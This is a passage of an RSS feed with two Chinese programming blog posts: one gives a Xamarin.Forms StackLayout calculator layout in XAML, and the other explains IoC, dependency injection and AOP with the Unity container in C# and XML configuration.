&lt;h4 id=&quot;stacklayout实现一个简易的计算器布局&quot;&gt;3.StackLayout实现一个简易的计算器布局&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1220420/201810/1220420-20181007221722289-2136546236.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&amp;gt;
&amp;lt;ContentPage xmlns=&quot;http://xamarin.com/schemas/2014/forms&quot;
             xmlns:x=&quot;http://schemas.microsoft.com/winfx/2009/xaml&quot;
             x:Class=&quot;XamarinFormsLayout.CalculatorPage&quot;
             BackgroundColor=&quot;#808080&quot;&amp;gt;
    &amp;lt;ContentPage.Resources&amp;gt;
        &amp;lt;ResourceDictionary&amp;gt;
            &amp;lt;Style x:Key=&quot;DefaultButton&quot; TargetType=&quot;Button&quot;&amp;gt;
                &amp;lt;Setter Property=&quot;BackgroundColor&quot; Value=&quot;Black&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
                &amp;lt;Setter Property=&quot;TextColor&quot; Value=&quot;#dedede&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
            &amp;lt;/Style&amp;gt;
        &amp;lt;/ResourceDictionary&amp;gt;
    &amp;lt;/ContentPage.Resources&amp;gt;
    &amp;lt;StackLayout Orientation=&quot;Vertical&quot;  Spacing=&quot;10&quot; VerticalOptions=&quot;End&quot; Padding=&quot;10&quot;&amp;gt;
        &amp;lt;Frame BackgroundColor=&quot;White&quot; HeightRequest=&quot;40&quot; Margin=&quot;0,0,0,20&quot;&amp;gt;
            &amp;lt;Label Text=&quot;0&quot; VerticalOptions=&quot;Center&quot; HorizontalOptions=&quot;End&quot;TextColor=&quot;Black&quot;FontSize=&quot;35&quot;/&amp;gt;
        &amp;lt;/Frame&amp;gt;
        &amp;lt;StackLayout Orientation=&quot;Vertical&quot;&amp;gt;
            &amp;lt;StackLayout Orientation=&quot;Horizontal&quot;   Spacing=&quot;10&quot;&amp;gt;
                &amp;lt;StackLayout Orientation=&quot;Vertical&quot; HorizontalOptions=&quot;FillAndExpand&quot;&amp;gt;
                    &amp;lt;Button  Text=&quot;清除&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;   Text=&quot;7&quot;  Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;8&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;9&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;4&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;5&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;6&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;   Text=&quot;1&quot; Style=&quot;{StaticResource DefaultButton}&quot; /&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;2&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;   Text=&quot;3&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                    &amp;lt;StackLayout Orientation=&quot;Horizontal&quot; HeightRequest=&quot;60&quot;&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;0&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                        &amp;lt;Button HorizontalOptions=&quot;FillAndExpand&quot;  Text=&quot;.&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;/StackLayout&amp;gt;
                &amp;lt;/StackLayout&amp;gt;
                &amp;lt;StackLayout Orientation=&quot;Vertical&quot; WidthRequest=&quot;60&quot;&amp;gt;
                    &amp;lt;Button  Text=&quot;÷&quot;  HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;*&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;+&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;-&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                    &amp;lt;Button Text=&quot;=&quot; HeightRequest=&quot;60&quot; Style=&quot;{StaticResource DefaultButton}&quot;/&amp;gt;
                &amp;lt;/StackLayout&amp;gt;
            &amp;lt;/StackLayout&amp;gt;
        &amp;lt;/StackLayout&amp;gt;
    &amp;lt;/StackLayout&amp;gt;
&amp;lt;/ContentPage&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;总结&quot;&gt;4.总结&lt;/h4&gt;
&lt;p&gt;xamarin forms的布局都是基于wpf的思想，padding和margin的四个方向是左上右下，这和android、前端css的四个方向上右下左有点区别。&lt;br/&gt;常用的布局就我个人而言StackLayout和Grid使用的最为广泛和简单，其他的几种布局写起来相对复杂，效果也相对不佳。&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 14:15:00 +0000</pubDate>
<dc:creator>张林-布莱恩特</dc:creator>
<og:description>通过这篇文章你将了解到xamarin forms中最简单常用的布局StackLayout。至于其他几种布局使用起来，效果相对较差，目前在项目中使用最多的也就是这两种布局StackLayout和Grid</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhangmumu/p/9751788.html</dc:identifier>
</item>
<item>
<title>IOC的理解,整合AOP,解耦对Service层和Dal层的依赖 - 从未太晚</title>
<link>http://www.cnblogs.com/kongsq/p/9751716.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kongsq/p/9751716.html</guid>
<description>&lt;p&gt;&lt;br/&gt; DIP依赖倒置原则：系统架构时，高层模块不应该依赖于低层模块，二者通过抽象来依赖&lt;br/&gt;依赖抽象，而不是细节&lt;/p&gt;&lt;p&gt; 贯彻依赖倒置原则，左边能抽象，右边实例化的时候不能直接用抽象，所以需要借助一个第三方&lt;/p&gt;&lt;p&gt; 高层本来是依赖低层，但是可以通过工厂(容器)来决定细节，去掉了对低层的依赖&lt;br/&gt; IOC控制反转：把高层对低层的依赖，转移到第三方决定，避免高层对低层的直接依赖(是一种目的)&lt;br/&gt;那么程序架构就具备良好扩展性和稳定性&lt;/p&gt;&lt;p&gt;DI依赖注入：是用来实现IOC的一种手段,&lt;br/&gt; 在构造对象时，可以自动的去初始化，对象需要的对象&lt;br/&gt;构造函数注入 属性注入 方法注入,IOC容器初始化ApplePhone的时候 通过配置文件实例化 属性,方法,构造函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.Practices.Unity;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections.Generic;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Linq;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Text;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Threading.Tasks;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Ruanmou.Interface;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Unity.Attributes;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; Ruanmou.Service
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ApplePhone : IPhone
    {
        [Dependency]&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;属性注入：不错，但是有对容器的依赖&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; IMicrophone iMicrophone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IHeadphone iHeadphone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IPower iPower { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[InjectionConstructor]&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ApplePhone()
        {
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}构造函数&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.GetType().Name);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[InjectionConstructor]&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;构造函数注入：最好的，默认找参数最多的构造函数&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ApplePhone(IHeadphone headphone)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.iHeadphone =&lt;span&gt; headphone;
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}带参数构造函数&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.GetType().Name);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Call()
        {
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{0}打电话&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.GetType().Name); 
        }

        [InjectionMethod]&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;方法注入：最不好的，增加一个没有意义的方法，破坏封装&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Init1234(IPower power)
        {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.iPower =&lt;span&gt; power;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;不管是构造对象，还是注入对象，这里都是靠反射做到的&lt;/p&gt;
&lt;p&gt;有了依赖注入，才可能做到无限层级的依赖抽象，才能做到控制反转&lt;/p&gt;

&lt;p&gt;IOC Unity容器 可以通过代码注册或配置文件注册接口对应实现类,实现了不依赖具体,可以对对象全局单例,线程单例&lt;/p&gt;
&lt;p&gt;例子1&lt;/p&gt;
&lt;p&gt;Service业务逻辑层升级,在原有1.0的基础上添加一些功能,使用配置文件注册&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;container &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;testContainer1&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.ApplePhone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;Android&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IMicrophone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Microphone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IHeadphone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Headphone, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPower, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Power, Ruanmou.Service&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruamou.DAL.BaseDAL, Ruamou.DAL&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;container&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;container &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;testContainer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;Android&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IMicrophone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Microphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IHeadphone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Headphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPower, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Power, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruamou.DAL.BaseDAL, Ruamou.DAL&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;container&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;只需要把服务2.0的类库(实现1.0的原有接口)dll拿过来即可使用,代码不做任何修改&lt;/p&gt;
&lt;p&gt;例子2 业务扩展，新加功能&lt;/p&gt;
&lt;p&gt;应该是加几个接口和实现类的映射,就可以解决了。&lt;/p&gt;
&lt;p&gt;例子3 实现AOP&lt;/p&gt;
&lt;p&gt;方法需要加日志，加异常管理，可以不修改原有代码，直接新加异常管理类等的类库，在Unity配置文件添加AOP配置节点即可实现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/527658/201810/527658-20181007214912991-57487101.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置文件配置，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;container &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;testContainerAOP&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;extension &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Interception&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptor &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;InterfaceInterceptor&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.AuthorizeBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.SmsBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.ExceptionLoggingBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.CachingBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.LogBeforeBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.ParameterCheckBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;interceptionBehavior &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Framework.AOP.LogAfterBehavior, Ruanmou.Framework&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;register&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPhone,Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;Android&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IMicrophone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Microphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IHeadphone, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Headphone, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Interface.IPower, Ruanmou.Interface&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.Service.Power, Ruanmou.Service.Extend&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;register &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL&quot;&lt;/span&gt;&lt;span&gt; mapTo&lt;/span&gt;&lt;span&gt;=&quot;Ruamou.DAL.BaseDAL, Ruamou.DAL&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;register&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;container&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 贴一个异常处理的AOP例子代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; Ruanmou.Framework.AOP
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ExceptionLoggingBehavior : IInterceptionBehavior
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;Type&amp;gt;&lt;span&gt; GetRequiredInterfaces()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Type.EmptyTypes;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; IMethodReturn Invoke(IMethodInvocation input, GetNextInterceptionBehaviorDelegate getNext)
        {
            IMethodReturn methodReturn &lt;/span&gt;=&lt;span&gt; getNext()(input, getNext);

            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ExceptionLoggingBehavior&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (methodReturn.Exception == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;无异常&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;异常:{methodReturn.Exception.Message}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; methodReturn;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; WillExecute
        {
            &lt;/span&gt;&lt;span&gt;get&lt;/span&gt; { &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;; }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;例子4 数据访问层的替换，因为已经不依赖具体实现，把配置文件的接口对应的数据访问层实现类替换即可，配置文件格式为InterFace Map 实现类&lt;/p&gt;
&lt;p&gt;数据访问层的封装公共增删改查，Unity 管理 EF DBcontext，保持全局或线程单例还没有看到，最近在学内存管理和.Net垃圾回收&lt;/p&gt;

</description>
<pubDate>Sun, 07 Oct 2018 14:00:00 +0000</pubDate>
<dc:creator>从未太晚</dc:creator>
<og:description>DIP依赖倒置原则：系统架构时，高层模块不应该依赖于低层模块，二者通过抽象来依赖依赖抽象，而不是细节 贯彻依赖倒置原则，左边能抽象，右边实例化的时候不能直接用抽象，所以需要借助一个第三方</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kongsq/p/9751716.html</dc:identifier>
</item>
</channel>
</rss>